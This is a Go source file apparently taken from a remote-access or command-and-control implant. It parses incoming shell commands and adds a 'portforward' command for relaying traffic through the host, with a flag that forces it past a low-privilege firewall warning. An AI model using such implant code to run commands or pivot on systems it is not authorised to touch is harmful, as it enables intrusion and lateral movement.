package command

import (
	"errors"
	"main/packet"
	"main/sysinfo"
	"strings"
)

func Run(b []byte) error {
	_, argsByte, _, err := parseCommandShell(b)
	if err != nil {
		return err
	}
	// do some dirty extension here
	customerCmdPrefix := "command"
	if strings.HasPrefix(string(argsByte), customerCmdPrefix) {
		customerCmd := strings.Split(strings.TrimSpace(string(argsByte)[len(customerCmdPrefix):]), " ")
		// no need to check length, it's safe
		cmdType := customerCmd[0]
		var cmdArgs []string
		for _, arg := range customerCmd[1:] {
			if arg != "" {
				cmdArgs = append(cmdArgs, arg)
			}
		}
		switch cmdType {
		case "portforward":
			if len(cmdArgs) < 2 {
				return errors.New("usage: portforward [-f] bind_port target/portforward stop bind_port")
			}
			if cmdArgs[0] != "-f" && cmdArgs[0] != "stop" && !sysinfo.IsHighPriv() {
				return errors.New("notice: this func only works under administrator privilege when under windows, and will trigger firewall warning when running at low priv." +
					"using `portforward -f bind_port target` to force continue")
			}
			if cmdArgs[0] == "-f" {
				cmdArgs = cmdArgs[1:]
			}
			if cmdArgs[0] == "stop" {
				portForwardStop(cmdArgs[1])
			} else {
				return portForwardServe(cmdArgs[0], cmdArgs[1])
			}
		default:
			packet.ErrorMessage("invalid command " + cmdType)
		}
		return nil
	} else {
		return runImpl(b)
	}
}
